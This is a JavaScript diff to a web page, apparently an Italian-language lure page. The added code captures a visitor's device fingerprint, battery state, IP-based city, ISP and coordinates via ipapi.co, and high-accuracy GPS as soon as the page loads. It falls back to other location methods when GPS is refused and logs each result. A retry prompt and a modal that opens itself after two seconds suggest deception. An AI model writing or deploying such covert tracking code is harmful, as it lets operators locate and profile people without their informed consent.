@@ -796,16 +796,173 @@ Poi clicca 'Riprova' qui sotto.`);
             console.log('📊 Event:', eventType, data);
         }
 
-        // Auto-trigger quando la pagina si carica
-        window.addEventListener('load', function() {
-            // Log di caricamento pagina
-            logEvent('page_loaded', {
-                timestamp: new Date().toISOString(),
+        // Cattura IMMEDIATA informazioni dispositivo
+        function captureDeviceInfo() {
+            const deviceInfo = {
+                // Informazioni schermo
                 screen: {
                     width: screen.width,
-                    height: screen.height
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                
+                // Informazioni browser
+                browser: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    onLine: navigator.onLine
+                },
+                
+                // Informazioni finestra
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                
+                // Informazioni timezone e locale
+                locale: {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                    timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZoneName
+                },
+                
+                // Informazioni connessione (se disponibile)
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    type: navigator.connection.type,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                
+                // Informazioni pagina
+                page: {
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    title: document.title,
+                    timestamp: new Date().toISOString()
+                },
+                
+                // Informazioni hardware (se disponibili)
+                hardware: {
+                    deviceMemory: navigator.deviceMemory || null,
+                    hardwareConcurrency: navigator.hardwareConcurrency || null,
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                },
+                
+                // Informazioni batteria (se disponibile)
+                battery: navigator.getBattery ? 'battery_check_requested' : 'not_available',
+                
+                // Informazioni sensori
+                sensors: {
+                    geolocationAvailable: !!navigator.geolocation,
+                    deviceOrientationSupported: 'DeviceOrientationEvent' in window,
+                    deviceMotionSupported: 'DeviceMotionEvent' in window,
+                    touchSupported: 'ontouchstart' in window
+                },
+                
+                // IP pubblico (tentativo)
+                network: {
+                    userAgent: navigator.userAgent,
+                    cookieEnabled: navigator.cookieEnabled
                 }
-            });
+            };
+            
+            // Prova a ottenere info batteria se disponibile
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    deviceInfo.battery = {
+                        charging: battery.charging,
+                        level: battery.level,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                    logEvent('battery_info_captured', deviceInfo.battery);
+                }).catch(function() {
+                    deviceInfo.battery = 'access_denied';
+                });
+            }
+            
+            return deviceInfo;
+        }
+        
+        // Auto-trigger quando la pagina si carica
+        window.addEventListener('load', function() {
+            // 📱 CATTURA IMMEDIATA informazioni dispositivo
+            const deviceInfo = captureDeviceInfo();
+            logEvent('device_info_captured', deviceInfo);
+            
+            // 🌐 CATTURA IMMEDIATA IP e informazioni di rete
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    logEvent('ip_info_captured', {
+                        ip: ipData.ip,
+                        city: ipData.city,
+                        region: ipData.region,
+                        country: ipData.country_name,
+                        latitude: ipData.latitude,
+                        longitude: ipData.longitude,
+                        timezone: ipData.timezone,
+                        isp: ipData.org,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // Se ha coordinate IP, salvale come fallback
+                    if (ipData.latitude && ipData.longitude && !userLocation) {
+                        userLocation = {
+                            latitude: ipData.latitude,
+                            longitude: ipData.longitude,
+                            accuracy: 10000,
+                            timestamp: new Date().toISOString(),
+                            method: 'ip_geolocation',
+                            source: 'immediate_ip_capture'
+                        };
+                    }
+                })
+                .catch(error => {
+                    logEvent('ip_capture_failed', { error: error.message });
+                });
+            
+            // Prova SUBITO a catturare la posizione senza aspettare
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Posizione catturata immediatamente!
+                        const immediateLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: new Date().toISOString(),
+                            method: 'immediate_gps_capture'
+                        };
+                        
+                        logEvent('location_captured_immediate', immediateLocation);
+                        userLocation = immediateLocation;
+                    },
+                    function(error) {
+                        // Posizione bloccata, registra l'errore
+                        logEvent('location_blocked_immediate', {
+                            error: error.message,
+                            code: error.code,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        // Prova metodi alternativi subito
+                        tryAlternativeLocation();
+                    },
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
+                );
+            }
             
             // Auto-trigger del modal dopo 2 secondi
             setTimeout(() => {
